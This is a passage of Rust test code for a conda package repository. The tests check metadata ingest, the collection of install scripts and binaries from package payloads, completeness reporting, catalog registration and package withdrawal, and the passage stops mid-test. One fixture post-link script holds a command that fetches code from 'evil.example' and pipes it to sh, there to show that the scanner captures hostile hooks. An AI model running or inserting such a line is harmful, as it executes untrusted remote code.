    /// The real ingest path, end to end over real package bytes: extract,
    /// persist, read back.
    #[test]
    fn test_identity_round_trips_through_the_real_ingest_path() {
        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");
        let persisted = build_conda_metadata(
            "numpy",
            "1.26.4",
            "py312h02b7e37_0",
            "linux-64",
            "conda_v2",
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                "numpy",
                "1.26.4",
                "py312h02b7e37_0",
                "linux-64",
                "numpy-1.26.4-py312h02b7e37_0.conda",
                Some(&extracted),
            ),
        );

        let stored = conda_identity::read_identity(&persisted).expect("identity is persisted");
        assert_eq!(stored.name, "numpy");
        assert_eq!(stored.version, "1.26.4");
        assert!(stored
            .conda_purl
            .as_deref()
            .expect("purl")
            .starts_with("pkg:conda/numpy@1.26.4?build=py312h02b7e37_0"));
        assert_eq!(
            stored.pypi_advisory_targets(),
            vec![("numpy".to_string(), "1.26.4".to_string())]
        );

        // Identity is additive: #4037/#4038's keys are untouched by it.
        assert_eq!(persisted["name"], "numpy");
        assert_eq!(persisted["subdir"], "linux-64");
        assert_eq!(
            package_run_exports(Some(&persisted))["weak"][0],
            "numpy >=1.26.4,<2.0a0"
        );
    }

    /// The raw recipe is persisted verbatim for `conda_recipe.rs` to parse; the
    /// ingest path must not have parsed or rewritten it.
    #[test]
    fn test_persisted_recipe_is_raw_text() {
        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");
        let persisted = build_conda_metadata(
            "numpy",
            "1.26.4",
            "py312h02b7e37_0",
            "linux-64",
            "conda_v2",
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                "numpy",
                "1.26.4",
                "py312h02b7e37_0",
                "linux-64",
                "numpy-1.26.4-py312h02b7e37_0.conda",
                Some(&extracted),
            ),
        );

        assert_eq!(
            persisted["recipe"]["meta.yaml"].as_str(),
            Some(TEST_RECIPE_META_YAML),
            "the recipe must be handed on byte-for-byte, Jinja included"
        );
    }

    // -----------------------------------------------------------------------
    // Install scripts live in the PAYLOAD, not in `info/` (#4033)
    // -----------------------------------------------------------------------

    /// TEST FIXTURE: a shell post-link script with something worth reviewing in
    /// it, so a test can prove the *bytes* travelled and not just the path.
    const TEST_POST_LINK_SH: &[u8] = b"#!/bin/sh\ncurl -sL https://evil.example/x | sh\n";

    /// TEST FIXTURE: the smallest `info/` tree that still extracts.
    fn minimal_info_files() -> Vec<(&'static str, Vec<u8>)> {
        vec![(
            "info/index.json",
            serde_json::to_vec(&serde_json::json!({
                "name": "numpy", "version": "1.26.4",
                "build": "py312h02b7e37_0", "build_number": 0,
            }))
            .unwrap(),
        )]
    }

    /// TEST FIXTURE: a `.conda` (v2) package with BOTH members — the `info-`
    /// tar and the `pkg-` payload tar. The existing
    /// `build_test_conda_v2_package_with_info` writes only the info member,
    /// which is exactly the blind spot this test group exists to cover.
    fn build_test_conda_v2_package_with_payload(
        info_files: &[(&str, Vec<u8>)],
        payload_files: &[(&str, Vec<u8>)],
    ) -> Vec<u8> {
        let info_tar =
            zstd::encode_all(std::io::Cursor::new(&build_info_tar(info_files)), 3).unwrap();
        let payload_tar =
            zstd::encode_all(std::io::Cursor::new(&build_info_tar(payload_files)), 3).unwrap();

        let mut zip_buf = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            writer.start_file("metadata.json", options).unwrap();
            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
            writer
                .start_file("info-numpy-1.26.4-py312h02b7e37_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &info_tar).unwrap();
            writer
                .start_file("pkg-numpy-1.26.4-py312h02b7e37_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &payload_tar).unwrap();
            writer.finish().unwrap();
        }
        zip_buf
    }

    /// The whole point of the epic: a `.conda` keeps its link scripts in
    /// `pkg-*.tar.zst`, which ingest never opened. The bytes must come back.
    #[test]
    fn test_conda_v2_payload_post_link_script_is_collected() {
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[
                (
                    "lib/python3.12/site-packages/numpy/__init__.py",
                    b"x = 1\n".to_vec(),
                ),
                ("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec()),
            ],
        );

        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");

        assert_eq!(
            harvest.scripts,
            vec![(
                "bin/.numpy-post-link.sh".to_string(),
                TEST_POST_LINK_SH.to_vec()
            )],
            "the payload script must be collected with its body intact"
        );
        assert!(harvest.unreadable.is_empty());
        assert!(!harvest.truncated);
    }

    /// A v1 `.tar.bz2` keeps `info/` and the payload in one tar, so the same
    /// walk has to find the script there too.
    #[test]
    fn test_conda_v1_payload_post_link_script_is_collected() {
        let mut files = minimal_info_files();
        files.push(("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec()));
        files.push(("bin/.numpy-pre-unlink.sh", b"#!/bin/sh\nrm -f x\n".to_vec()));
        let package = build_test_conda_v1_package_with_info(&files);

        let harvest =
            collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.tar.bz2");

        let paths: Vec<&str> = harvest.scripts.iter().map(|(p, _)| p.as_str()).collect();
        assert_eq!(
            paths,
            vec!["bin/.numpy-post-link.sh", "bin/.numpy-pre-unlink.sh"],
            "every hook in the v1 tar is collected"
        );
        assert!(harvest.unreadable.is_empty());
    }

    /// Windows packages ship `.bat` hooks under `Scripts/`. `classify_script_path`
    /// owns that decision; ingest must not second-guess it with its own matcher.
    #[test]
    fn test_conda_windows_bat_hook_is_collected() {
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[
                ("Scripts/.numpy-post-link.bat", b"@echo off\r\n".to_vec()),
                ("Lib/site-packages/numpy/__init__.py", b"x = 1\n".to_vec()),
            ],
        );

        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");

        assert_eq!(
            harvest.scripts.len(),
            1,
            "the .bat hook is a script, the module is not"
        );
        assert_eq!(harvest.scripts[0].0, "Scripts/.numpy-post-link.bat");
    }

    /// The recipe's archived copy under `info/` also matches the classifier.
    /// Collecting it is deliberate — `package_analysis_service` dedupes by body
    /// digest and marks the recipe copy — so ingest hands over both.
    #[test]
    fn test_conda_recipe_copy_of_script_is_also_collected() {
        let mut info = minimal_info_files();
        info.push(("info/recipe/post-link.sh", TEST_POST_LINK_SH.to_vec()));
        let package = build_test_conda_v2_package_with_payload(
            &info,
            &[("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec())],
        );

        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");

        let paths: Vec<&str> = harvest.scripts.iter().map(|(p, _)| p.as_str()).collect();
        assert!(
            paths.contains(&"info/recipe/post-link.sh"),
            "the info member is scanned too: {:?}",
            paths
        );
        assert!(paths.contains(&"bin/.numpy-post-link.sh"), "{:?}", paths);
    }

    /// The binary cataloger's harvest half (#4046): a shared library in the
    /// payload is collected with its bytes, and the cataloger identifies the
    /// library a recipe-less package vendors from the bytes alone.
    #[test]
    fn test_conda_v2_payload_shared_library_is_harvested_and_cataloged() {
        let webp = crate::services::binary_catalog::tests::build_test_elf(
            Some("libwebp.so.7.1.3"),
            Some(&[0xde, 0xad, 0xbe, 0xef]),
            b"some decoder strings\0libwebp 1.3.2\0",
        );
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[
                ("lib/libwebp.so.7.1.3", webp),
                (
                    "lib/python3.12/site-packages/numpy/__init__.py",
                    b"x = 1\n".to_vec(),
                ),
            ],
        );

        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");

        assert_eq!(harvest.binaries.len(), 1, "the .py file is not a candidate");
        assert_eq!(harvest.binaries[0].0, "lib/libwebp.so.7.1.3");

        let findings = crate::services::binary_catalog::catalog_payload(&harvest.binaries);
        let webp = findings
            .iter()
            .find(|f| f.name == "libwebp")
            .expect("the banner identifies libwebp in a package with no recipe");
        assert_eq!(webp.version.as_deref(), Some("1.3.2"));
        assert_eq!(
            webp.detection_method,
            format!(
                "binary:soname+banner:{}",
                crate::services::binary_catalog::RULE_BANNER_LIBWEBP
            )
        );
    }

    /// The statically-linked shape: an executable with no SONAME whose bytes
    /// carry a well-known banner, in a v1 package that publishes no recipe.
    #[test]
    fn test_conda_v1_static_binary_banner_is_harvested_and_cataloged() {
        let curl = crate::services::binary_catalog::tests::build_test_elf(
            None,
            None,
            b"OpenSSL 1.1.1w  11 Sep 2023\0",
        );
        let mut files = minimal_info_files();
        files.push(("bin/curl", curl));
        let package = build_test_conda_v1_package_with_info(&files);

        let harvest = collect_conda_install_scripts(&package, "curl-8.5.0-h1234_0.tar.bz2");

        assert_eq!(harvest.binaries.len(), 1);
        assert_eq!(harvest.binaries[0].0, "bin/curl");

        let findings = crate::services::binary_catalog::catalog_payload(&harvest.binaries);
        let ssl = findings
            .iter()
            .find(|f| f.name == "openssl")
            .expect("a statically linked OpenSSL is identified by its banner");
        assert_eq!(ssl.version.as_deref(), Some("1.1.1w"));
        assert_eq!(
            ssl.detection_method,
            format!(
                "binary:banner:{}",
                crate::services::binary_catalog::RULE_BANNER_OPENSSL
            ),
            "no SONAME to agree with, and the method must say so"
        );
    }

    /// A shell script in `bin/` matches the path heuristic but fails the magic
    /// check: it is not buffered for cataloging.
    #[test]
    fn test_conda_non_elf_candidate_is_not_harvested() {
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[("bin/activate", b"#!/bin/sh\necho hi\n".to_vec())],
        );
        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
        assert!(harvest.binaries.is_empty());
    }

    /// A package that ships no hooks yields nothing, and nothing is not a gap:
    /// the analysis stays `Complete` so the UI can say "we looked, there are
    /// none" rather than hedging on every package.
    #[test]
    fn test_conda_package_without_scripts_is_complete() {
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[(
                "lib/python3.12/site-packages/numpy/__init__.py",
                b"x = 1\n".to_vec(),
            )],
        );
        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
        assert!(harvest.scripts.is_empty());

        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");
        assert_eq!(
            conda_analysis_completeness(Some(&extracted), &harvest),
            crate::services::package_analysis_service::Completeness::Complete,
        );
    }

    /// A script that was read in full is not a gap either.
    #[test]
    fn test_conda_readable_script_keeps_analysis_complete() {
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec())],
        );
        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");

        assert_eq!(harvest.scripts.len(), 1);
        assert_eq!(
            conda_analysis_completeness(Some(&extracted), &harvest),
            crate::services::package_analysis_service::Completeness::Complete,
        );
    }

    /// A hook past the per-entry read cap must be recorded as unreadable AND
    /// must knock the analysis off `Complete`. Reporting `complete` while
    /// dropping a script is the exact defect this epic removes.
    #[test]
    fn test_conda_oversized_script_is_unreadable_and_partial() {
        let oversized = vec![b'#'; (MAX_CONDA_SCRIPT_ENTRY_BYTES + 1024) as usize];
        let package = build_test_conda_v2_package_with_payload(
            &minimal_info_files(),
            &[("bin/.numpy-post-link.sh", oversized)],
        );
        assert!(
            package.len() < 1024 * 1024,
            "the compressed package stays small, so the cap is what bounds the read"
        );

        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");

        assert!(
            harvest.scripts.is_empty(),
            "an over-cap script is not silently truncated into the analysis"
        );
        assert_eq!(
            harvest.unreadable,
            vec!["bin/.numpy-post-link.sh".to_string()]
        );

        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("ingest must not fail on an over-cap script");
        match conda_analysis_completeness(Some(&extracted), &harvest) {
            crate::services::package_analysis_service::Completeness::Partial { reason, .. } => {
                assert!(
                    reason.contains("bin/.numpy-post-link.sh"),
                    "the reason names the script we could not read: {reason}"
                );
            }
            other => panic!("expected Partial, got {other:?}"),
        }
    }

    /// The payload walk carries the shared entry-count cap. A package with more
    /// entries than the cap stops early, and everything after that point is
    /// unseen — which is `Partial`, not `Complete`.
    #[test]
    fn test_conda_payload_entry_cap_truncates_and_is_partial() {
        let filler: Vec<(String, Vec<u8>)> = (0
            ..crate::util::bounded_archive::MAX_INGEST_ARCHIVE_ENTRIES + 1)
            .map(|i| (format!("lib/f{i}.py"), Vec::new()))
            .collect();
        let mut payload: Vec<(&str, Vec<u8>)> = filler
            .iter()
            .map(|(p, b)| (p.as_str(), b.clone()))
            .collect();
        payload.push(("bin/.numpy-post-link.sh", TEST_POST_LINK_SH.to_vec()));

        let package = build_test_conda_v2_package_with_payload(&minimal_info_files(), &payload);
        let harvest = collect_conda_install_scripts(&package, "numpy-1.26.4-py312h02b7e37_0.conda");

        assert!(
            harvest.truncated,
            "the walk must report that it stopped before the end"
        );
        assert!(
            harvest.scripts.is_empty(),
            "the script sits past the entry cap and was never reached"
        );

        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");
        assert!(
            matches!(
                conda_analysis_completeness(Some(&extracted), &harvest),
                crate::services::package_analysis_service::Completeness::Partial { .. }
            ),
            "a truncated scan cannot claim completeness"
        );
    }

    /// An unreadable `info/` member and an unreadable script are both gaps, and
    /// the recorded reason has to name both rather than the first one found.
    #[test]
    fn test_conda_completeness_reports_metadata_and_script_gaps_together() {
        let harvest = CondaScriptHarvest {
            scripts: Vec::new(),
            binaries: Vec::new(),
            unreadable: vec!["bin/.p-post-link.sh".to_string()],
            truncated: false,
        };
        let extracted = serde_json::json!({
            "info_files": { "paths_json": "unreadable", "about_json": "present" },
        });

        match conda_analysis_completeness(Some(&extracted), &harvest) {
            crate::services::package_analysis_service::Completeness::Partial { reason, .. } => {
                assert!(reason.contains("paths_json"), "{reason}");
                assert!(reason.contains("bin/.p-post-link.sh"), "{reason}");
            }
            other => panic!("expected Partial, got {other:?}"),
        }
    }

    /// Nothing decoded at all is `NotRead`, never `Complete` — unchanged by the
    /// script work, and pinned here because it is the most dangerous mislabel.
    #[test]
    fn test_conda_completeness_without_extraction_is_not_read() {
        assert!(matches!(
            conda_analysis_completeness(None, &CondaScriptHarvest::default()),
            crate::services::package_analysis_service::Completeness::NotRead { .. }
        ));
    }

    /// A package whose container cannot be opened yields no scripts rather than
    /// failing the ingest.
    #[test]
    fn test_conda_script_collection_never_fails_on_garbage() {
        assert_eq!(
            collect_conda_install_scripts(b"not a zip", "pkg-1.0-0.conda").scripts,
            Vec::new()
        );
        assert_eq!(
            collect_conda_install_scripts(b"not bzip2", "pkg-1.0-0.tar.bz2").scripts,
            Vec::new()
        );
        assert_eq!(
            collect_conda_install_scripts(b"whatever", "pkg.whl"),
            CondaScriptHarvest::default()
        );
    }

    /// The recipe files handed to the analyzer still come out of the extracted
    /// document, and are unaffected by the script work.
    #[test]
    fn test_conda_recipe_files_come_from_the_extracted_document() {
        let doc = serde_json::json!({
            "recipe": { "meta.yaml": "package:\n  name: p\n" },
        });
        assert_eq!(
            conda_recipe_files(&doc),
            vec![("meta.yaml".to_string(), b"package:\n  name: p\n".to_vec())]
        );
    }
}

// ---------------------------------------------------------------------------
// #3659: the native publish path must register the package catalog row.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod catalog_registration_tests {
    use crate::api::handlers::test_db_helpers as tdh;

    /// Build a minimal but valid conda v1 package: a bzip2 tar carrying
    /// `info/index.json` whose fields agree with the filename.
    fn conda_v1_package(name: &str, version: &str, build: &str) -> Vec<u8> {
        let index = serde_json::json!({
            "name": name,
            "version": version,
            "build": build,
            "build_number": 0,
            "subdir": "noarch",
            "summary": "a catalogued conda package",
        });
        let index_bytes = serde_json::to_vec(&index).unwrap();

        let mut tar_data = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut tar_data);
            let mut header = tar::Header::new_gnu();
            header.set_path("info/index.json").unwrap();
            header.set_size(index_bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append(&header, &index_bytes[..]).unwrap();
            builder.finish().unwrap();
        }

        let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
        std::io::Write::write_all(&mut enc, &tar_data).unwrap();
        enc.finish().unwrap()
    }

    /// A conda upload must register the catalog row under the package's own
    /// name/version (the build string stays out of the key).
    #[tokio::test]
    async fn conda_upload_registers_catalog_row() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let body = conda_v1_package("catalogpkg", "1.2.3", "py39_0");
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!("/{}/upload", fx.repo_key))
            .header("X-Conda-Subdir", "noarch")
            .header("X-Package-Filename", "catalogpkg-1.2.3-py39_0.tar.bz2")
            .body(axum::body::Body::from(body))
            .unwrap();
        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "conda upload failed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let row = tdh::catalog_row(&fx.pool, fx.repo_id, "catalogpkg").await;
        fx.teardown().await;

        let row = row.expect("a conda upload must write a packages row (#3659)");
        assert_eq!(row.version, "1.2.3");
        assert_eq!(row.versions, vec!["1.2.3".to_string()]);
        assert_eq!(
            row.description.as_deref(),
            Some("a catalogued conda package")
        );
    }
}

// ---------------------------------------------------------------------------
// #4037/#4038: the full `info/` tree must survive a real publish and come back
// out of the endpoints that serve it.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod info_tree_round_trip_tests {
    use crate::api::handlers::test_db_helpers as tdh;

    const ROUND_TRIP_RECIPE: &str = "package:\n  name: rtpkg\n  version: {{ version }}\n";

    /// Build a valid conda v1 package carrying the whole `info/` tree, with
    /// `index.json` agreeing with the filename the upload declares.
    fn conda_v1_package_with_info_tree(name: &str, version: &str, build: &str) -> Vec<u8> {
        let json = |v: serde_json::Value| serde_json::to_vec(&v).unwrap();
        let members: Vec<(&str, Vec<u8>)> = vec![
            (
                "info/index.json",
                json(serde_json::json!({
                    "name": name,
                    "version": version,
                    "build": build,
                    "build_number": 0,
                    "subdir": "noarch",
                    "depends": [],
                })),
            ),
            (
                "info/about.json",
                json(serde_json::json!({
                    "summary": "a round-tripped conda package",
                    "description": "carries the whole info/ tree",
                    "home": "https://example.invalid/rtpkg",
                    "doc_url": "https://example.invalid/rtpkg/docs",
                    "dev_url": "https://example.invalid/rtpkg/src",
                    "source_url": "https://example.invalid/rtpkg-1.0.0.tar.gz",
                    "license": "MIT",
                    "license_family": "MIT",
                })),
            ),
            (
                "info/paths.json",
                json(serde_json::json!({
                    "paths_version": 1,
                    "paths": [{
                        "_path": "lib/rtpkg/__init__.py",
                        "path_type": "hardlink",
                        "sha256": "4444444444444444444444444444444444444444444444444444444444444444",
                        "size_in_bytes": 7,
                    }],
                })),
            ),
            (
                "info/recipe/meta.yaml",
                ROUND_TRIP_RECIPE.as_bytes().to_vec(),
            ),
            (
                "info/run_exports.json",
                json(serde_json::json!({ "weak": ["rtpkg >=1.0.0,<2.0a0"] })),
            ),
            (
                "info/hash_input.json",
                json(serde_json::json!({ "python": "3.9.* *_cpython" })),
            ),
        ];

        let mut tar_data = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut tar_data);
            for (path, bytes) in &members {
                let mut header = tar::Header::new_gnu();
                header.set_path(path).unwrap();
                header.set_size(bytes.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                builder.append(&header, &bytes[..]).unwrap();
            }
            builder.finish().unwrap();
        }

        let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
        std::io::Write::write_all(&mut enc, &tar_data).unwrap();
        enc.finish().unwrap()
    }

    /// Publish a package carrying the whole `info/` tree, then read it back
    /// through `run_exports.json` and `channeldata.json`.
    ///
    /// Before #4038 both endpoints served fields the upload path never wrote:
    /// every hosted package's run exports came back as `{}` and its
    /// channeldata entry had no summary, home or source_url.
    #[tokio::test]
    async fn published_info_tree_reaches_run_exports_and_channeldata() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };

        let body = conda_v1_package_with_info_tree("rtpkg", "1.0.0", "py39_0");
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!("/{}/upload", fx.repo_key))
            .header("X-Conda-Subdir", "noarch")
            .header("X-Package-Filename", "rtpkg-1.0.0-py39_0.tar.bz2")
            .body(axum::body::Body::from(body))
            .unwrap();
        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "conda upload failed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let (re_status, re_body) = tdh::send(
            fx.router_with_auth(super::router()),
            tdh::get(format!("/{}/noarch/run_exports.json", fx.repo_key)),
        )
        .await;
        let (cd_status, cd_body) = tdh::send(
            fx.router_with_auth(super::router()),
            tdh::get(format!("/{}/channeldata.json", fx.repo_key)),
        )
        .await;

        fx.teardown().await;

        assert_eq!(re_status, axum::http::StatusCode::OK);
        let run_exports: serde_json::Value = serde_json::from_slice(&re_body).unwrap();
        let served = &run_exports["packages"]["rtpkg-1.0.0-py39_0.tar.bz2"]["run_exports"];
        assert_ne!(
            served,
            &serde_json::json!({}),
            "run_exports.json served an empty object for a package that declares run exports"
        );
        assert_eq!(served["weak"][0], "rtpkg >=1.0.0,<2.0a0");

        assert_eq!(cd_status, axum::http::StatusCode::OK);
        let channeldata: serde_json::Value = serde_json::from_slice(&cd_body).unwrap();
        let entry = &channeldata["packages"]["rtpkg"];
        assert_eq!(entry["summary"], "a round-tripped conda package");
        assert_eq!(entry["home"], "https://example.invalid/rtpkg");
        assert_eq!(
            entry["source_url"],
            "https://example.invalid/rtpkg-1.0.0.tar.gz"
        );
        assert_eq!(entry["license"], "MIT");
    }

    /// The persisted document must carry the rest of the `info/` tree too, so
    /// the per-file index and the recipe parser can pick it up from the
    /// database rather than re-opening the archive.
    #[tokio::test]
    async fn published_info_tree_is_persisted_whole() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };

        let body = conda_v1_package_with_info_tree("rtstore", "2.0.0", "py39_0");
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!("/{}/upload", fx.repo_key))
            .header("X-Conda-Subdir", "noarch")
            .header("X-Package-Filename", "rtstore-2.0.0-py39_0.tar.bz2")
            .body(axum::body::Body::from(body))
            .unwrap();
        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "conda upload failed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let metadata: Option<serde_json::Value> = sqlx::query_scalar(
            "SELECT am.metadata FROM artifact_metadata am
             JOIN artifacts a ON a.id = am.artifact_id
             WHERE a.repository_id = $1 AND a.is_deleted = false
             LIMIT 1",
        )
        .bind(fx.repo_id)
        .fetch_optional(&fx.pool)
        .await
        .expect("query artifact metadata")
        .flatten();

        fx.teardown().await;

        let metadata = metadata.expect("a conda upload must persist artifact metadata");
        assert_eq!(metadata["paths"]["source"], "paths.json");
        assert_eq!(metadata["paths"]["has_hashes"], true);
        assert_eq!(
            metadata["paths"]["paths"][0]["_path"],
            "lib/rtpkg/__init__.py"
        );
        assert_eq!(
            metadata["recipe"]["meta.yaml"].as_str(),
            Some(ROUND_TRIP_RECIPE),
            "the recipe must reach the database as raw text"
        );
        assert_eq!(metadata["hash_input"]["python"], "3.9.* *_cpython");
        assert_eq!(metadata["info_files"]["link_json"], "absent");
        assert_eq!(metadata["info_files"]["about_json"], "present");
        assert_eq!(metadata["has_install_scripts"], false);
    }

    /// A package built before conda-build normalised the list spelling of
    /// `run_exports` carries a bare list in `info/run_exports.json`. Publish
    /// one and fetch it: the CEP-12 endpoint must serve the dict form, which
    /// is the only shape a CEP-12 client accepts for the per-package member.
    #[tokio::test]
    async fn published_legacy_list_run_exports_serves_cep12_dict() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };

        let json = |v: serde_json::Value| serde_json::to_vec(&v).unwrap();
        let members: Vec<(&str, Vec<u8>)> = vec![
            (
                "info/index.json",
                json(serde_json::json!({
                    "name": "legpkg",
                    "version": "0.9.1",
                    "build": "0",
                    "build_number": 0,
                    "subdir": "noarch",
                })),
            ),
            // The legacy spelling: a bare list of specs, i.e. weak exports.
            (
                "info/run_exports.json",
                json(serde_json::json!(["legpkg >=0.9.1,<0.10a0"])),
            ),
        ];
        let mut tar_data = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut tar_data);
            for (path, bytes) in &members {
                let mut header = tar::Header::new_gnu();
                header.set_path(path).unwrap();
                header.set_size(bytes.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                builder.append(&header, &bytes[..]).unwrap();
            }
            builder.finish().unwrap();
        }
        let mut enc = bzip2::write::BzEncoder::new(Vec::new(), bzip2::Compression::default());
        std::io::Write::write_all(&mut enc, &tar_data).unwrap();
        let body = enc.finish().unwrap();

        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!("/{}/upload", fx.repo_key))
            .header("X-Conda-Subdir", "noarch")
            .header("X-Package-Filename", "legpkg-0.9.1-0.tar.bz2")
            .body(axum::body::Body::from(body))
            .unwrap();
        let (status, resp) = tdh::send(fx.router_with_auth(super::router()), req).await;
        assert!(
            status.is_success(),
            "conda upload failed: {status} {}",
            String::from_utf8_lossy(&resp)
        );

        let (re_status, re_body) = tdh::send(
            fx.router_with_auth(super::router()),
            tdh::get(format!("/{}/noarch/run_exports.json", fx.repo_key)),
        )
        .await;

        fx.teardown().await;

        assert_eq!(re_status, axum::http::StatusCode::OK);
        let run_exports: serde_json::Value = serde_json::from_slice(&re_body).unwrap();
        let served = &run_exports["packages"]["legpkg-0.9.1-0.tar.bz2"]["run_exports"];
        assert_eq!(
            served,
            &serde_json::json!({ "weak": ["legpkg >=0.9.1,<0.10a0"] }),
            "run_exports.json must serve the CEP-12 dict, not the legacy bare list"
        );
    }
}

// ---------------------------------------------------------------------------
// #4059: per-package withdrawal (purge-via-quarantine) for conda channels.
//
// Withdrawing ONE package must remove it from every served repodata variant
// (repodata.json, current_repodata, bz2/zst, JLAP, CEP-16 shards, run_exports,
// channeldata) and from direct download, while the row stays in `artifacts`
// (auditable, reversible) and a CEP-6 channel notice explains the withdrawal.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod withdrawal_tests {
    use super::*;
    use crate::api::handlers::test_db_helpers as tdh;
    use bytes::Bytes;

    const GOOD: &str = "good-1.0-0.tar.bz2";
    const BAD: &str = "bad-2.0-0.tar.bz2";

    async fn seed_pair(fx: &tdh::Fixture) -> (uuid::Uuid, uuid::Uuid) {
        let repo = fx.repo_info("local", None);
        let mut ids = Vec::new();
        for (filename, name, version) in [(GOOD, "good", "1.0"), (BAD, "bad", "2.0")] {
            let path = format!("noarch/{filename}");
            let storage_key = format!("conda/{}/{}", fx.repo_id, path);
            ids.push(
                tdh::seed_artifact(
                    &fx.state,
                    &fx.pool,
                    &repo,
                    &storage_key,
                    &path,
                    name,
                    version,
                    "application/x-tar",
                    Bytes::from_static(b"conda package payload"),
                    fx.user_id,
                )
                .await,
            );
        }
        (ids[0], ids[1])
    }

    fn delete_req(uri: String, reason: Option<&str>) -> axum::http::Request<Body> {
        let body = match reason {
            Some(r) => serde_json::to_vec(&serde_json::json!({ "reason": r })).unwrap(),
            None => Vec::new(),
        };
        axum::http::Request::builder()
            .method("DELETE")
            .uri(uri)
            .header("content-type", "application/json")
            .body(Body::from(body))
            .unwrap()
    }

    fn admin_router(fx: &tdh::Fixture) -> Router {
        tdh::router_with_auth_ext(
            router(),
            fx.state.clone(),
            tdh::admin_auth(fx.user_id, &fx.username),
        )
    }

    async fn get_json(fx: &tdh::Fixture, suffix: &str) -> (StatusCode, serde_json::Value) {
        let (status, body) = tdh::send(
            fx.router_with_auth(router()),
            tdh::get(format!("/{}/{suffix}", fx.repo_key)),
        )
        .await;
        let json = serde_json::from_slice(&body)
            .unwrap_or_else(|e| panic!("{suffix} must serve JSON: {e}"));
        (status, json)
    }

    fn package_names(repodata: &serde_json::Value) -> Vec<String> {
        let mut names: Vec<String> = repodata["packages"]
            .as_object()
            .into_iter()
            .chain(repodata["packages.conda"].as_object())
            .flat_map(|m| m.keys().cloned())
            .collect();
        names.sort();
        names
    }

    // -----------------------------------------------------------------------
    // is_withdrawn: the pure blocking predicate behind the repodata filter.
    // Must mirror the download gate exactly (#4059 mutation-check anchor).
    // -----------------------------------------------------------------------

    #[test]
    fn is_withdrawn_mirrors_the_download_gate() {
        let now = chrono::Utc::now();
        let future = now + chrono::Duration::minutes(30);
        let past = now - chrono::Duration::minutes(30);

        // Withdrawn: permanent admin hold, live hold, rejected.
        assert!(is_withdrawn(Some("quarantined"), None, now));
        assert!(is_withdrawn(Some("quarantined"), Some(future), now));
        assert!(is_withdrawn(Some("rejected"), None, now));

        // Not withdrawn: never held, released, clean, and an EXPIRED hold
        // (the download gate serves it again, so repodata must list it).
        assert!(!is_withdrawn(None, None, now));
